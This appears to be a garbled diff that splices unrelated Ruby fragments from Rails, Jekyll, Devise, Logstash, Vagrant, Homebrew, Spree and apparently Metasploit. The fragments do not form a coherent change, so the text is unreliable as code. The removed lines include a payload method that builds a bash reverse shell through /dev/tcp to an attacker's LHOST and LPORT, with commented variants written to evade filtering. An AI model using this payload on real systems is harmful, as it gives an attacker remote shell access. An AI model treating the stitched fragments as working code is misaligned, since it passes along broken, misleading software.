@@ -1,226 +1,192 @@
 
         
-          # Specifies the header that your server uses for sending files.
-  # config.action_dispatch.x_sendfile_header = 'X-Sendfile' # for Apache
-  # config.action_dispatch.x_sendfile_header = 'X-Accel-Redirect' # for NGINX
-    
-        assert_equal <<~MESSAGE, run_routes_command
-                                     Prefix Verb   URI Pattern                                                                              Controller#Action
-              rails_mandrill_inbound_emails POST   /rails/action_mailbox/mandrill/inbound_emails(.:format)                                  action_mailbox/ingresses/mandrill/inbound_emails#create
-              rails_postmark_inbound_emails POST   /rails/action_mailbox/postmark/inbound_emails(.:format)                                  action_mailbox/ingresses/postmark/inbound_emails#create
-                 rails_relay_inbound_emails POST   /rails/action_mailbox/relay/inbound_emails(.:format)                                     action_mailbox/ingresses/relay/inbound_emails#create
-              rails_sendgrid_inbound_emails POST   /rails/action_mailbox/sendgrid/inbound_emails(.:format)                                  action_mailbox/ingresses/sendgrid/inbound_emails#create
-               rails_mailgun_inbound_emails POST   /rails/action_mailbox/mailgun/inbound_emails/mime(.:format)                              action_mailbox/ingresses/mailgun/inbound_emails#create
-             rails_conductor_inbound_emails GET    /rails/conductor/action_mailbox/inbound_emails(.:format)                                 rails/conductor/action_mailbox/inbound_emails#index
-                                            POST   /rails/conductor/action_mailbox/inbound_emails(.:format)                                 rails/conductor/action_mailbox/inbound_emails#create
-          new_rails_conductor_inbound_email GET    /rails/conductor/action_mailbox/inbound_emails/new(.:format)                             rails/conductor/action_mailbox/inbound_emails#new
-         edit_rails_conductor_inbound_email GET    /rails/conductor/action_mailbox/inbound_emails/:id/edit(.:format)                        rails/conductor/action_mailbox/inbound_emails#edit
-              rails_conductor_inbound_email GET    /rails/conductor/action_mailbox/inbound_emails/:id(.:format)                             rails/conductor/action_mailbox/inbound_emails#show
-                                            PATCH  /rails/conductor/action_mailbox/inbound_emails/:id(.:format)                             rails/conductor/action_mailbox/inbound_emails#update
-                                            PUT    /rails/conductor/action_mailbox/inbound_emails/:id(.:format)                             rails/conductor/action_mailbox/inbound_emails#update
-                                            DELETE /rails/conductor/action_mailbox/inbound_emails/:id(.:format)                             rails/conductor/action_mailbox/inbound_emails#destroy
-      rails_conductor_inbound_email_reroute POST   /rails/conductor/action_mailbox/:inbound_email_id/reroute(.:format)                      rails/conductor/action_mailbox/reroutes#create
-                         rails_service_blob GET    /rails/active_storage/blobs/:signed_id/*filename(.:format)                               active_storage/blobs#show
-                  rails_blob_representation GET    /rails/active_storage/representations/:signed_blob_id/:variation_key/*filename(.:format) active_storage/representations#show
-                         rails_disk_service GET    /rails/active_storage/disk/:encoded_key/*filename(.:format)                              active_storage/disk#show
-                  update_rails_disk_service PUT    /rails/active_storage/disk/:encoded_token(.:format)                                      active_storage/disk#update
-                       rails_direct_uploads POST   /rails/active_storage/direct_uploads(.:format)                                           active_storage/direct_uploads#create
-    MESSAGE
-  end
-    
-        # Read all the content files from <source>/<dir>/magic_dir
-    #   and return them with the type klass.
-    #
-    # dir - The String relative path of the directory to read.
-    # magic_dir - The String relative directory to <dir>,
-    #   looks for content here.
-    # klass - The return type of the content.
-    #
-    # Returns klass type of content files
-    def read_content(dir, magic_dir, matcher)
-      @site.reader.get_entries(dir, magic_dir).map do |entry|
-        next unless entry =~ matcher
-    
-              @highlighter = begin
-            if @config.key?('enable_coderay') && @config['enable_coderay']
-              Jekyll::Deprecator.deprecation_message(
-                'You are using 'enable_coderay', ' \
-                'use syntax_highlighter: coderay in your configuration file.'
-              )
-    
-          Jekyll.logger.info '', 'and done. Generating results..'
-      Jekyll.logger.info ''
-    end
-    
-    def liquid_escape(markdown)
-  markdown.gsub(%r!(`{[{%].+[}%]}`)!, '{% raw %}\\1{% endraw %}')
-end
-    
-    require 'jekyll'
-require 'mercenary'
-    
-              theme.create!
-          Jekyll.logger.info 'Your new Jekyll theme, #{theme.name.cyan},' \
-                             ' is ready for you in #{theme.path.to_s.cyan}!'
-          Jekyll.logger.info 'For help getting started, read #{theme.path}/README.md.'
-        end
-        # rubocop:enable Metrics/AbcSize
+              def export_name_on_schema_dump?
+        !ActiveRecord::SchemaDumper.fk_ignore_pattern.match?(name) if name
       end
+    
+    class RenderJSTest < ActionController::TestCase
+  class TestController < ActionController::Base
+    protect_from_forgery
+    
+    require 'abstract_unit'
+require 'controller/fake_models'
+require 'active_support/logger'
+    
+        should 'set the linenos option to 'table' ' \
+           'if the linenos key is given the table value' do
+      tag = highlight_block_with_opts('ruby linenos=table ')
+      assert_equal(
+        { :linenos => 'table' },
+        tag.instance_variable_get(:@highlight_options)
+      )
     end
-  end
+    
+    module Jekyll
+  class Reader
+    attr_reader :site
+    
+    # No trailing slash
+Benchmark.ips do |x|
+  path = '/some/very/very/long/path/to/a/file/i/like/'
+  x.report('pre_pr:#{path}')    { pre_pr(path) }
+  x.report('pr:#{path}')        { pr(path) }
+  x.report('envygeeks:#{path}') { pr(path) }
+  x.compare!
 end
 
     
-    class Devise::ConfirmationsController < DeviseController
-  # GET /resource/confirmation/new
-  def new
-    self.resource = resource_class.new
-  end
+      </body>
+</html>
+HTML
+CONTENT_NOT_CONTAINING = <<-HTML.freeze
+<!DOCTYPE HTML>
+<html lang='en-US'>
+  <head>
+<meta http-equiv='Content-Type' content='text/html; charset=UTF-8'>
+    <meta charset='UTF-8'>
+    <title>Jemoji</title>
+    <meta name='viewport' content='width=device-width,initial-scale=1'>
+    <link rel='stylesheet' href='/css/screen.css'>
+  </head>
+  <body class='wrap'>
+    <p><img class='emoji' title=':+1:' alt=':+1:' src='https://assets.github.com/images/icons/emoji/unicode/1f44d.png' height='20' width='20' align='absmiddle'></p>
     
-              path
+          CHARS = {
+        :failed    => '\u2718'.red,
+        :pending   => '\u203D'.yellow,
+        :undefined => '\u2718'.red,
+        :passed    => '\u2714'.green,
+        :skipped   => '\u203D'.blue,
+      }.freeze
+    
+            def initialize
+          @websockets = []
+          @connections_count = 0
+          @started_event = Utils::ThreadEvent.new
+          @stopped_event = Utils::ThreadEvent.new
         end
-      end
     
-          # Checks whether the user session has expired based on configured time.
-      def timedout?(last_access)
-        !timeout_in.nil? && last_access && last_access <= timeout_in.ago
-      end
-    
-        ret << '\r\n'
-  end
-    
-      #
-  # Returns the command string to use for execution
-  #
-  def command_string
-    fd = rand(200) + 20
-    return '0<&#{fd}-;exec #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']};sh <&#{fd} >&#{fd} 2>&#{fd}';
-    # same thing, no semicolons
-    #return '/bin/bash #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} <&#{fd} >&#{fd}'
-    # same thing, no spaces
-    #return 's=${IFS:0:1};eval$s\'bash${s}#{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']}$s<&#{fd}$s>&#{fd}&\''
+    # Unset all host plugins so that we aren't executing subprocess things
+# to detect a host for every test.
+Vagrant.plugin('2').manager.registered.dup.each do |plugin|
+  if plugin.components.hosts.to_hash.length > 0
+    Vagrant.plugin('2').manager.unregister(plugin)
   end
 end
-
     
-      #
-  # Overrides the builtin 'each' operator to avoid the following exception on Ruby 1.9.2+
-  #    'can't add a new key into hash during iteration'
-  #
-  def each(&block)
-    list = []
-    self.keys.sort.each do |sidx|
-      list << [sidx, self[sidx]]
-    end
-    list.each(&block)
-  end
+    require File.expand_path('../../base', __FILE__)
     
-          when IAX_CTRL_BUSY
-        dprint('BUSY')
-        self.busy  = true
-        self.state = :hangup
-        self.client.send_ack(self)
-    
-      #
-  # Payload types were identified from xCAT-server source code (IPMI.pm)
-  #
-  PAYLOAD_IPMI = 0
-  PAYLOAD_SOL  = 1
-  PAYLOAD_RMCPPLUSOPEN_REQ = 0x10
-  PAYLOAD_RMCPPLUSOPEN_REP = 0x11
-  PAYLOAD_RAKP1 = 0x12
-  PAYLOAD_RAKP2 = 0x13
-  PAYLOAD_RAKP3 = 0x14
-  PAYLOAD_RAKP4 = 0x15
-    
-      def self.create_ipmi_rakp_1(bmc_session_id, console_random_id, username)
-    head = [
-      0x06, 0x00, 0xff, 0x07,  # RMCP Header
-      0x06,                    # RMCP+ Authentication Type
-      PAYLOAD_RAKP1,           # Payload Type
-      0x00, 0x00, 0x00, 0x00,
-      0x00, 0x00, 0x00, 0x00,
-    ].pack('C*')
-    
-              # Encodes the Rex::Proto::Kerberos::CredentialCache::Time into an String
-          #
-          # @return [String] encoded time
-          def encode
-            encoded = ''
-            encoded << encode_auth_time
-            encoded << encode_start_time
-            encoded << encode_end_time
-            encoded << encode_renew_time
-    
-              # Encodes the msg_type field
-          #
-          # @return [OpenSSL::ASN1::Integer]
-          def encode_msg_type
-            bn = OpenSSL::BN.new(msg_type.to_s)
-            int = OpenSSL::ASN1::Integer.new(bn)
-    
-    testdata( File.dirname($0) + '/scandata', ARGV ).each do |file|
-  $stderr.print File.basename(file) + ': '
-  begin
-    ok = File.read(file)
-    s = Racc::GrammarFileScanner.new( ok )
-    sym, (val, _lineno) = s.scan
-    if printonly then
-      $stderr.puts
-      $stderr.puts val
-      next
-    end
-    
-    describe 'GzipReader#getc' do
-    
-        gz.pos.should == 0
-    
-      before :each do
-    @z = Zlib::Inflate.new
-  end
-    
-            if LogStash::PluginMetadata.exists?(plugin_id.to_s)
-          plugin_metadata = LogStash::PluginMetadata.for_plugin(plugin_id.to_s)
-          cluster_uuid = plugin_metadata&.get(:cluster_uuid)
-          segment[:cluster_uuid] = cluster_uuid unless cluster_uuid.nil?
-        end
-    
-          linux_host_os.each do |host|
-        it '#{host} returns false' do
-          allow(LogStash::Environment).to receive(:host_os).and_return(host)
-          expect(LogStash::Environment.linux?).to be_truthy
-        end
+          @logger.debug('Enabling default remote RubyGems sources')
+      default_sources.each do |src|
+        @logger.debug('Adding source - #{src}')
+        Gem.sources << src
       end
-    end
-  end
-end
-
     
-        File.join(basedir, 'config', 'startup.options').tap do |path|
-      dir.input('#{path}=/etc/logstash')
-    end
-    File.join(basedir, 'config', 'jvm.options').tap do |path|
-      dir.input('#{path}=/etc/logstash')
-    end
-    File.join(basedir, 'config', 'logstash.yml').tap do |path|
-      dir.input('#{path}=/etc/logstash')
-    end
-    File.join(basedir, 'config', 'logstash-sample.conf').tap do |path|
-      dir.input('#{path}=/etc/logstash')
-    end
-    File.join(basedir, 'pkg', 'pipelines.yml').tap do |path|
-      dir.input('#{path}=/etc/logstash')
-    end
-    
-    RSpec.describe RuboCop::AST::IfNode do
-  let(:if_node) { parse_source(source).ast }
-    
-          def remove_files(files, dirs, remove_count)
-        # Batch file deletions, deleting over 130,000+ files will crash
-        # File.delete.
-        files[0, remove_count].each_slice(10_000).each do |files_slice|
-          File.delete(*files_slice)
+            opts = OptionParser.new do |o|
+          o.banner = 'Usage: vagrant global-status'
+          o.separator ''
+          o.on('--prune', 'Prune invalid entries.') do |p|
+            options[:prune] = true
+          end
         end
-        dirs.each { |dir| Dir.rmdir(dir) if Dir['#{dir}/*'].empty? }
-      end
+    
+        def check_sha256_actually_256(sha256: cask.sha256, stanza: 'sha256')
+      odebug 'Verifying #{stanza} string is a legal SHA-256 digest'
+      return unless sha256.is_a?(String)
+      return if sha256.length == 64 && sha256[/^[0-9a-f]+$/i]
+    
+              unless method_called_ever?(body_node, :go_resource)
+            # processed_source.ast is passed instead of body_node because `require` would be outside body_node
+            find_method_with_args(processed_source.ast, :require, 'language/go') do
+              problem 'require \'language/go\' is unnecessary unless using `go_resource`s'
+            end
+          end
+    
+        @resource.url(val, specs)
+    dependency_collector.add(@resource)
+  end
+    
+          expect(dep.name).to eq('foo')
+      expect(dep.tags).to include(:head)
     end
+    
+        it 'raises an error when duplicate resources are defined' do
+      subject.resource('foo') { url 'foo-1.0' }
+      expect {
+        subject.resource('foo') { url 'foo-1.0' }
+      }.to raise_error(DuplicateResourceError)
+    end
+    
+        its(:inspect) { is_expected.to eq('#<JavaRequirement: [] version='1.7+'>') }
+  end
+    
+              # Xcode 2.x's xcodebuild has a different version string
+          case xcodebuild_output[/DevToolsCore-(\d+\.\d)/, 1]
+          when '515.0' then return '2.0'
+          when '798.0' then return '2.5'
+          end
+        end
+    
+        attr_predicate :binaries?, :force?, :skip_cask_deps?, :require_sha?,
+                   :reinstall?, :upgrade?, :verbose?, :installed_as_dependency?,
+                   :quarantine?
+    
+        context 'with an unusually long query string' do
+      let(:url) do
+        [
+          'https://node49152.ssl.fancycdn.example.com',
+          '/fancycdn/node/49152/file/upload/download',
+          '?cask_class=zf920df',
+          '&cask_group=2348779087242312',
+          '&cask_archive_file_name=cask.zip',
+          '&signature=CGmDulxL8pmutKTlCleNTUY%2FyO9Xyl5u9yVZUE0',
+          'uWrjadjuz67Jp7zx3H7NEOhSyOhu8nzicEHRBjr3uSoOJzwkLC8L',
+          'BLKnz%2B2X%2Biq5m6IdwSVFcLp2Q1Hr2kR7ETn3rF1DIq5o0lHC',
+          'yzMmyNe5giEKJNW8WF0KXriULhzLTWLSA3ZTLCIofAdRiiGje1kN',
+          'YY3C0SBqymQB8CG3ONn5kj7CIGbxrDOq5xI2ZSJdIyPysSX7SLvE',
+          'DBw2KdR24q9t1wfjS9LUzelf5TWk6ojj8p9%2FHjl%2Fi%2FVCXN',
+          'N4o1mW%2FMayy2tTY1qcC%2FTmqI1ulZS8SNuaSgr9Iys9oDF1%2',
+          'BPK%2B4Sg==',
+        ].join
+      end
+    
+          def to_sym
+        SYMBOLS.invert.fetch(@version) { :dunno }
+      end
+    
+      it { is_expected.to change(Notification, :count).by(1) }
+    
+        def available_status(product) # will return a human readable string
+      return Spree.t(:discontinued)  if product.discontinued?
+      return Spree.t(:deleted) if product.deleted?
+    
+          unless order.payments.present?
+        card_to_reuse = original_order.valid_credit_cards.first
+        card_to_reuse = original_order.user.credit_cards.default.first if !card_to_reuse && original_order.user
+        Spree::Payment.create!(order: order,
+                               payment_method_id: card_to_reuse.try(:payment_method_id),
+                               source: card_to_reuse,
+                               amount: order.total)
+      end
+    
+        context 'stock should not restock' do
+      context 'return_item is not resellable' do
+        before { return_item.resellable = false }
+    
+          rescue_from ActionController::ParameterMissing, with: :error_during_processing
+      rescue_from ActiveRecord::RecordInvalid, with: :error_during_processing
+      rescue_from ActiveRecord::RecordNotFound, with: :not_found
+      rescue_from CanCan::AccessDenied, with: :unauthorized
+      rescue_from Spree::Core::GatewayError, with: :gateway_error
+    
+            def update
+          authorize! :update, @order, order_token
+          @address = find_address
+    
+            def new; end
+    
+            def purchase
+          perform_payment_action(:purchase)
+        end
+    
+            def new; end
